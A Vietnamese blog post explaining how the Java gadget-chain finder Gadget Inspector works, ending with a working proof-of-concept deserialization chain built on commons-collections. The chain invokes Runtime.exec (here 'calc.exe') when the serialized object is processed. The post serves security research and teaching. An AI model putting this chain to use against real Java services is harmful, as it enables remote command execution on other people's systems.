---
title: Gadget Inspector 101
author: HoangND
date: 2023-09-07 08:51:00 +0700
categories: [Others]
tags: []
---

# TLDR
Chuyện là gần đây người em cùng team lên bài phân tích một lỗ hổng deserialize mới, sử dụng Gadget chain mới là Jython2, mình mới thắc mắc làm sao người ta tìm được gadget mới. Mình có biết về tool Gadget Inspector nhưng ít khi làm java, thành ra cũng không hiểu tool nó làm cái gì bên trong. Nhân dịp này đi sâu vào code một chút xem thế nào.

# Analysis
Gadget Inpector khởi chạy từ hàm Main của lớp GadgetInspector. Đoạn mã chính như bên dưới, các step cực kỳ rõ ràng
![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/0ad26e8f-09db-47ff-b874-87f99b55c0ae)

## Bước 1: Methods and classes discovery
Đoạn này hiểu đơn giản Gadget Inspector thực hiện tìm kiếm toàn bộ method bên trong toàn bộ class của file jar/war thông qua lớp MethodDiscovery. Bên trong lớp này chứa lớp con MethodDiscoveryClassVisitor kế thừa từ lớp ClassVisitor để duyệt qua các thuộc tính của class. Sau khi hoàn tất, danh sách class được lưu vào file `classes.dat` và danh sách method được lưu vào `methods.dat`, cùng xem và hiểu cấu trúc mỗi entry bên trong 2 file này
### classes.dat
Trong phạm vi bài viết mình sử dụng kết quả khi chạy Gadget Inspector với lib Common-collections-3.1. Một entry trong class.dat có dạng như sau
```
com/google/common/base/CaseFormat$StringConverter	com/google/common/base/Converter	java/io/Serializable	false	sourceFormat!18!com/google/common/base/CaseFormat!targetFormat!18!com/google/common/base/CaseFormat
```

Cấu trúc của entry này như sau
- Tên class ->                    `com/google/common/base/CaseFormat$StringConverter`
- Parent classes ->                 `com/google/common/base/Converter`, nếu class không kế thừa lớp nào mặc định trường này sẽ sử dụng `java/lang/Object` 
- Interfaces ->                    `java/io/Serializable`
- Có phải interface hay không ->  `false`
- Các biến bên trong class ->     `sourceFormat!18!com/google/common/base/CaseFormat!targetFormat!18!com/google/common/base/CaseFormat`

Đại diện cho entry này là class `ClassReference`

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/3693c642-fdb4-4b00-ba6e-8df9d8f09939)

### methods.dat
Một entry có dạng như sau
```
com/sun/org/apache/xpath/internal/axes/AxesWalker	cloneDeep	(Lcom/sun/org/apache/xpath/internal/axes/WalkingIterator;Ljava/util/Vector;)Lcom/sun/org/apache/xpath/internal/axes/AxesWalker;	false
```
- Tên class -> `com/sun/org/apache/xpath/internal/axes/AxesWalker`
- Tên method -> `cloneDeep`
- Các arguments -> `(Lcom/sun/org/apache/xpath/internal/axes/WalkingIterator;Ljava/util/Vector;)`
- Kiểu trả về của method -> `Lcom/sun/org/apache/xpath/internal/axes/AxesWalker`
- Là static method -> `false`

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/26b6c758-84d7-4ca3-9200-565f7f9b77f5)

Lưu ý các ký tự I -> int, Z -> boolean, V -> void, ...

### Xây dựng quan hệ
Hàm save được sử dụng để tạo hai file ở trên 

```java
public void save() throws IOException {
    DataLoader.saveData(Paths.get("classes.dat"), new ClassReference.Factory(), discoveredClasses);
    DataLoader.saveData(Paths.get("methods.dat"), new MethodReference.Factory(), discoveredMethods);
    Map<ClassReference.Handle, ClassReference> classMap = new HashMap<>();
    for (ClassReference clazz : discoveredClasses) {
        classMap.put(clazz.getHandle(), clazz);
    }
    InheritanceDeriver.derive(classMap).save();
}
```

Sau khi ghi classes và methods, Gadget Inspector tiếp tục tạo file `inheritanceMap.dat` lưu mối quan hệ kế thừa giữa các class
```
com/sun/jmx/snmp/agent/SnmpMibGroup	java/io/Serializable	java/lang/Object	com/sun/jmx/snmp/agent/SnmpMibOid	com/sun/jmx/snmp/agent/SnmpMibNode
```
- Tên class -> `com/sun/jmx/snmp/agent/SnmpMibGroup`
- Toàn bộ class hoặc interface mà class kế thừa -> `java/io/Serializable	java/lang/Object	com/sun/jmx/snmp/agent/SnmpMibOid	com/sun/jmx/snmp/agent/SnmpMibNode`

## Bước 2: Passthrough discovery
Bước này xác định quan hệ của cách tính giá trị return với các biến cục bộ hoặc params của hàm. Đại khái check xem đoạn return của hàm có sử dụng biến cục bộ của class hay params truyền vào hàm hay không.
Hàm discovery như sau

```java
public void discover(final ClassResourceEnumerator classResourceEnumerator, final GIConfig config) throws IOException {
    // Load methods, inheritance, classes
    Map<MethodReference.Handle, MethodReference> methodMap = DataLoader.loadMethods();
    Map<ClassReference.Handle, ClassReference> classMap = DataLoader.loadClasses();
    InheritanceMap inheritanceMap = InheritanceMap.load();

    // Get method calls
    Map<String, ClassResourceEnumerator.ClassResource> classResourceByName = discoverMethodCalls(classResourceEnumerator);
    
    // sort method calls using Topology algorythm
    List<MethodReference.Handle> sortedMethods = topologicallySortMethodCalls();

    // Calculate dataflow
    passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,
            config.getSerializableDecider(methodMap, inheritanceMap));
}
```

Bên trong hàm discoverMethodCalls sử dụng lớp con MethodCallDiscoveryClassVisitor và MethodCallDiscoveryMethodVisitor bên trong PassthroughDiscovery để lấy ra thông tin các lời gọi hàm. Lớp này kế thừa từ các lớp ClassVisitor mà MethodVisitor thuộc ASM framework trong java, theo [trang chủ](https://asm.ow2.io/), framework này dùng để phân tích và thao tác trên java bytecode. Kết quả phân tích lời gọi hàm được lưu vào biến methodCalls, một entry của biến này có dạng như sau

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/294054b6-5393-40c9-a821-8cbcbb36f7f4)

hàm getAttributes của lớp IIOMetadataNode gọi đến hàm constructor của lớp IIONamedNodeMap với biến tuyền vào là 1 List. (Để ý rằng key là hàm gọi, value là hàm được gọi)

Sau khi có dược danh sách methodCalls, hàm topologicallySortMethodCalls được sử dụng để sắp xếp lại sử dụng thuật toán DFS

```java
private List<MethodReference.Handle> topologicallySortMethodCalls() {
    Map<MethodReference.Handle, Set<MethodReference.Handle>> outgoingReferences = new HashMap<>();
    for (Map.Entry<MethodReference.Handle, Set<MethodReference.Handle>> entry : methodCalls.entrySet()) {
        MethodReference.Handle method = entry.getKey();
        outgoingReferences.put(method, new HashSet<>(entry.getValue()));
    }
    // Topological sort methods
    LOGGER.debug("Performing topological sort...");
    Set<MethodReference.Handle> dfsStack = new HashSet<>();
    Set<MethodReference.Handle> visitedNodes = new HashSet<>();
    List<MethodReference.Handle> sortedMethods = new ArrayList<>(outgoingReferences.size());
    for (MethodReference.Handle root : outgoingReferences.keySet()) {
        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);
    }
    LOGGER.debug(String.format("Outgoing references %d, sortedMethods %d", outgoingReferences.size(), sortedMethods.size()));
    return sortedMethods;
}
```

Về DFS sort bạn có thể tham khảo thêm tại [đây](https://www.geeksforgeeks.org/topological-sorting/). Nôm na với danh sách methodCalls mình sẽ tạo ra một sorted list để biểu thị cho 1 đồ thị có hướng. Thuật toán DFS sẽ từ 1 node cố gắng đi đến node sâu nhất có thể, khi gặp điểm cuối không thể đi được đến node khác nữa mới quay lại tìm đường khác. Thuật toán này sẽ cho ra kết quả khác nhau tùy theo node bắt đầu. Cuối cùng danh sách sắp xếp được lưu vào biến sortedMethods. Tuy nhiên biến này sẽ được sắp xếp ngược lại, quan sát ví dụ bên dưới để hiểu

```java
public String parentMethod(String arg){
    String vul = Obj.childMethod(arg);
    return vul;
}
```
và childMethod

```java
public String childMethod(String carg){
    return carg.toString();
}
```

Kết quả của Passthrough phụ thuộc vào quan hệ giữa lời gọi hàm con và các argument của hàm cha như trong ví dụ trên, return của hàm con có sử dụng arg của hàm cha. Để nhìn được điều này cần xem xét từ return của hàm con trước, do đó sortedMethods sẽ được sắp xếp ngược lại.

Như đã nêu qua ở trên, thuật toán DFS sẽ ưu tiên đi sâu nhất có thể từ node root, vậy nếu graph có mạch vòng thì sao, ứng dụng sẽ vĩnh viễn không dừng lại được. Để tránh điều này, tác giả sử dụng biến visitedNodes, nếu đã đi qua node thì sẽ return

```java
private static void dfsTsort(Map<MethodReference.Handle, Set<MethodReference.Handle>> outgoingReferences,
                                List<MethodReference.Handle> sortedMethods, Set<MethodReference.Handle> visitedNodes,
                                Set<MethodReference.Handle> stack, MethodReference.Handle node) {
    if (stack.contains(node)) {
        return;
    }
    if (visitedNodes.contains(node)) {
        return;
    }
    Set<MethodReference.Handle> outgoingRefs = outgoingReferences.get(node);
    if (outgoingRefs == null) {
        return;
    }
    stack.add(node);
    for (MethodReference.Handle child : outgoingRefs) {
        dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);
    }
    stack.remove(node);
    visitedNodes.add(node);
    sortedMethods.add(node);
}
```

Tuy nhiên điều này có một vấn đề, giả sử có 2 đường đi hợp lệ là A -> B -> C và A -> B -> X hợp lệ, khi xác định đường A -> B -> C trước thì B đã nằm trong visitedNodes, khi đó đường A -> B -> X sẽ không được thêm vào list. Sau cùng sortedMethos được đi qua hàm calculatePassthroughDataflow để generate file passthrough.dat. Cấu trúc của một entry tương đối khó hiểu

```
com/google/common/collect/ImmutableSortedMap	subMap	(Ljava/lang/Object;Ljava/lang/Object;)Ljava/util/SortedMap;	0,1,2,
```

- Tên class -> com/google/common/collect/ImmutableSortedMap
- Tên hàm -> subMap
- Tham số hàm -> (Ljava/lang/Object;Ljava/lang/Object;)
- Kiểu trả về -> Ljava/util/SortedMap;
- ???? -> 0,1,2,

Qua tìm hiểu slide gốc của tác giả ở Blackhat, mình hiểu là nó liên quan đến return của hàm, nhưng vẫn không hiểu sao lại có chỗ 0,1,2, chỗ thì mỗi 3,5. Sau đó mình tự đối chiếu, trace hàm, class, xem xét 1 số entry khác thì rút ra được nguyên tắc của đống này. Nếu hàm return có sử dụng biến cục bộ của class -> 0. Nếu hàm return có sử dụng các param của hàm -> đánh theo index của param. Xem xét hàm subMap từ entry trên

```java
@Override
public ImmutableSortedMap<K, V> subMap(K fromKey, K toKey) {
  return subMap(fromKey, true, toKey, false);
}
```

- Ta thấy đoạn return có sử dụng hàm subMap khác, là hàm cục bộ của class ImmutableSortedMap, do dó có 0
- Đoạn return có sử dụng param đầu là fromKey -> 1
- Đoạn return có sử dụng param thứ 2 là toKey -> 2

Từ đó mới có đoạn 0,1,2.

## Step 3: Discover callgraph từ passthrough
Bước này tương tự bước hay nhưng thay đoạn return thành các hàm con, là giá trị của các hàm con được gọi bên trong hàm này có bị ảnh hưởng bởi biến cục bộ của class hay params hay không. Nói hơi khó hiểu, ví dụ 1 entry bên dưới

```
com/sun/org/apache/xerces/internal/impl/dtd/XMLDTDDescription	<init>	(Lcom/sun/org/apache/xerces/internal/xni/XMLResourceIdentifier;Ljava/lang/String;)V	com/sun/org/apache/xerces/internal/xni/XMLResourceIdentifier	getBaseSystemId	()Ljava/lang/String;	1		0
```

Ở đây <init> là constructor, hàm constructor của XMLDTDDescription gọi đến hàm getBaseSystemId của lớp XMLResourceIdentifier. Để hiểu được đoạn 1  0 sau cùng ta cùng xem hàm constructor

```java
// Constructors:
    public XMLDTDDescription(XMLResourceIdentifier id, String rootName) {
        this.setValues(id.getPublicId(), id.getLiteralSystemId(),
                id.getBaseSystemId(), id.getExpandedSystemId());
        this.fRootName = rootName;
        this.fPossibleRoots = null;
    } // init(XMLResourceIdentifier, String)
```
- Biến id xuất phát từ param đầu tiên -> 1 (quy tắc this -> 0, params -> 1,2,3,.... tương tự như đã giải thích ở bước trước)
- Biến id được sử dụng bên trong hàm setValues là hàm cục bộ do gọi từ this -> 0

kết quả bước này được lưu vào callgraph.dat

## Step 4: Search For Available Sources
Bước này xác định các method có thể được xem là source dựa vào cơ chế ser-deser. Ví dụ: khi sử dụng proxy làm điểm đầu của chain, hàm invoke của lớp kế thừa lớp `java/lang/reflect/InvocationHandler` đều có thể là source. Kết quả của bước này tương đối dễ nhìn dễ hiểu

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/de7dcfbc-3546-40a2-bf20-1497d3a5c9de)

## Bước 5:
Bước này duyệt qua tất cả các source và tìm đệ quy tất cả lệnh gọi phương thức con có thể tiếp tục truyền tham số (sử dụng kết quả trong callgraph.dat) cho đến khi gặp phương thức trong sink. Nôm na bước này là xây dựng một tree và tìm tất cả đường đi có điểm cuối là sink (leaf node). Quá trình duyệt cây sử dụng thuật toán DFS. Hiện các sink bên dưới được sử dụng, đoạn này trong quá trình tích luỹ kiến thức có thể add thêm sink mới (rõ ràng việc hiểu và tối ưu tool tốt hơn như là mài sắc một thanh đao vậy)

```java
private boolean isSink(MethodReference.Handle method, int argIndex, InheritanceMap inheritanceMap) {
    if (method.getClassReference().getName().equals("java/io/FileInputStream")
            && method.getName().equals("<init>")) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/io/FileOutputStream")
            && method.getName().equals("<init>")) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/nio/file/Files")
        && (method.getName().equals("newInputStream")
            || method.getName().equals("newOutputStream")
            || method.getName().equals("newBufferedReader")
            || method.getName().equals("newBufferedWriter"))) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/lang/Runtime")
            && method.getName().equals("exec")) {
        return true;
    }
    // If we can invoke an arbitrary method, that's probably interesting (though this doesn't assert that we
    // can control its arguments). Conversely, if we can control the arguments to an invocation but not what
    // method is being invoked, we don't mark that as interesting.
    if (method.getClassReference().getName().equals("java/lang/reflect/Method")
            && method.getName().equals("invoke") && argIndex == 0) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/net/URLClassLoader")
            && method.getName().equals("newInstance")) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/lang/System")
            && method.getName().equals("exit")) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/lang/Shutdown")
            && method.getName().equals("exit")) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/lang/Runtime")
            && method.getName().equals("exit")) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/nio/file/Files")
            && method.getName().equals("newOutputStream")) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/lang/ProcessBuilder")
            && method.getName().equals("<init>") && argIndex > 0) {
        return true;
    }
    if (inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle("java/lang/ClassLoader"))
            && method.getName().equals("<init>")) {
        return true;
    }
    if (method.getClassReference().getName().equals("java/net/URL") && method.getName().equals("openStream")) {
        return true;
    }
    
    if (method.getClassReference().getName().equals("org/codehaus/groovy/runtime/InvokerHelper")
            && method.getName().equals("invokeMethod") && argIndex == 1) {
        return true;
    }
    if (inheritanceMap.isSubclassOf(method.getClassReference(), new ClassReference.Handle("groovy/lang/MetaClass"))
            && Arrays.asList("invokeMethod", "invokeConstructor", "invokeStaticMethod").contains(method.getName())) {
        return true;
    }
    if (method.getClassReference().getName().equals("org/python/core/PyCode") && method.getName().equals("call")) {
        return true;
    }
    
    return false;
}
```

Trên đây là toàn bộ những gì diễn ra bên trong Gadget inspector. Kết luận lại tool này vẫn còn nhiều vấn đề, dẫn đến việc khả năng miss chain vẫn còn tương đối, cơ chế chống loop hole vô tình để mất nhiều khả năng tìm ra chain hợp lệ, kiểu nhận về 1 kết quả false positive và có thể bỏ lỡ chưa biết bao nhiêu chain hợp lệ. Ở một bài [blog], tác giả thay đổi cơ chế chống deal loop, thay vì sử dụng visitedMethods thì đếm số lần visit qua một node, nếu lớn hơn 1 giá trị nhất định thì mới dừng duyệt. Hoặc theo mình nghĩ có thể áp dụng số node tối đa trong qua trình duyệt DFS từ 1 node, tuy nhiên mình cũng chưa thử.

# Try to use
Lệnh chạy Gadget inspector tương đối đơn giản

```
java -jar gadget-inspector-all.jar D:\assets\download\commons-collections-3.1.jar
```

hoặc nếu bạn muốn chạy toàn bộ lib jar trong 1 folder

```
java -jar gadget-inspector-all.jar D:\assets\project\*.jar
```

Kết quả là một đống bùi nhùi như sau

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/d9ac93a5-253e-4985-b830-aa242259d95c)

trong đó thông tin các gadget tìm được được lưu vào gadget-chains.txt. Để xác định chain là FP hay TP, đương nhiên chỉ còn cách tự code lại một hàm generate thôi. Ở đây mình vẫn sử dụng lib commons-collections-3.1.jar làm ví dụ, rõ ràng là miss hết các gadget chain CommonsCollections1, CommonsCollections5, CommonsCollections6, CommonsCollections7 đều trên lib này @@.

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/6f456609-512b-4558-8c38-0d0a000100a3)

Gadget chain được biểu diễn theo top down thì đương nhiên để code phần generate ta sẽ code từ bottom up. Đầu tiên xuất phát từ `InvokerTransformer.transform`, ở đây mình dùng luôn đoạn code của gadget CommonsCollections1.

```java
final String[] execArgs = new String[] { command };
// inert chain for setup
final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
// real chain for after setup
final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {
                String.class, Class[].class }, new Object[] {
                "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
        new InvokerTransformer("exec",
                new Class[] { String.class }, execArgs),
        new ConstantTransformer(1) };
Field field1 = transformerChain.getClass().getDeclaredField("iTransformers");
field1.setAccessible(true);
field1.set(transformerChain, transformers);
```

3 dòng cuối sử dụng Reflection để thay đổi biến iTransformers do biến này để private, tiếp thep là tạo lazymap

```java
final Map innerMap = new HashMap();
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
```

Tiếp theo cần đọc code của CompositeInvocationHandlerImpl để xem nhét lazymap vào thế nào. Hàm invoke của lớp này như sau

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/8e47eb48-2b3f-4d79-a062-5d1150acc5a2)

Như vậy lazymap sẽ nhét vào biến classToInvocationHandler.

```java
final CompositeInvocationHandlerImpl handler = new CompositeInvocationHandlerImpl();
Field field = handler.getClass().getDeclaredField("classToInvocationHandler");
field.setAccessible(true);
field.set(handler, lazyMap);
```

Lớp CompositeInvocationHandlerImpl kế thừa InvocationHandler, là lớp được sử dụng trong kỹ thuật proxy class trong java. Như vậy cần tạo proxy instance, sau đó put 1 entry bất kỳ để kích hoạt hàm invoke

```java
Map proxyInstance = (Map) Proxy.newProxyInstance(
        Main.class.getClassLoader(),
        new Class[] { Map.class },
        handler);
proxyInstance.put("hello", "world");
```

Code mình sử dụng để verify gadget chain này như sau

```java
package org.example;

import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
import org.apache.commons.collections.*

import javax.management.BadAttributeValueExpException;
import java.awt.*;
import java.io.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class Main {

    public static InvocationHandler getChain(final String command) throws Exception {
        final String[] execArgs = new String[] { command };
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        Field field1 = transformerChain.getClass().getDeclaredField("iTransformers");
        field1.setAccessible(true);
        field1.set(transformerChain, transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final CompositeInvocationHandlerImpl handler = new CompositeInvocationHandlerImpl();
        Field field = handler.getClass().getDeclaredField("classToInvocationHandler");
        field.setAccessible(true);
        field.set(handler, lazyMap);

        Map proxyInstance = (Map) Proxy.newProxyInstance(
                Main.class.getClassLoader(),
                new Class[] { Map.class },
                handler);

        proxyInstance.put("hello", "world");
        return handler;
    }

    public static void GeneratePayload(Object instance, String file)
            throws Exception {
        //Serialize the constructed payload and write it to the file
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(f.toPath()));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static void payloadTest(String file) throws Exception {
        //Read the written payload and deserialize it
        ObjectInputStream in = new ObjectInputStream(Files.newInputStream(Paths.get(file)));
        Object obj = in.readObject();
        System.out.println(obj);
        in.close();
    }

    public static void main(String[] args) throws Exception {
        InvocationHandler invocationHandler = getChain("calc.exe");
        GeneratePayload(invocationHandler, "test.ser");
        payloadTest("test.ser");
    }
}
```

Ví dụ ở trên tương có thể dựng và verify tương đối nhanh do nhiều bước ở trong chain đã được code ở trong chain khác. Có thể nói việc đọc và hiểu các chain ban đầu của ysoserial giúp ích rất nhiều cho bài toán tìm gadget chain mới. Đặc biệt là nhìn nhanh được chain mới có khả quan hay không. 















